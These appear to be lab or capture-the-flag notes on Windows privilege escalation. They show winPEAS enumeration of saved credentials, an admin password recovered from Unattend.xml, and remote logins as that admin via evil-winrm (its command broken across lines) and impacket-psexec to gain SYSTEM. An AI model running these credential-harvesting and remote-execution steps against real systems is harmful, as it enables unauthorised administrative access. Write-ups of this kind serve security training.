Enumerating saved creds:
```
.\winPEASany.exe windowscreds
.\winPEASany.exe filesinfo
```

In first command, didn't find much interesting. Just the hash of our current user, not very helpful for privesc.

In filesinfo however, we found this:
and this: (base64 encoded password string for presumably the admin user in the Unattend.xml file)

This might prove very useful. Perhaps get a session with rdp, winrm, or psexec etc. 
```
evil-
 -i 10.10.227.97 -u admin -p password123
```

impacket-psexec admin:'password123'@10.10.227.97 

As you can see ps-exec is preferable if you can use it as it grants you nt autority/system privileges if can access

![unnamed_0788a239680445ce9e7ccbbe498e8170](unnamed_0788a239680445ce9e7ccbbe498e8170.png)
![unnamed_9780bdafc33d4ca89ae08e63603e3f91](unnamed_9780bdafc33d4ca89ae08e63603e3f91.png)
![unnamed_f3b8da8f2ace4c99acc4294aabbe260e](unnamed_f3b8da8f2ace4c99acc4294aabbe260e.png)
![unnamed_c79e58c02a1e4ea9841cbd81116e069d](unnamed_c79e58c02a1e4ea9841cbd81116e069d.png)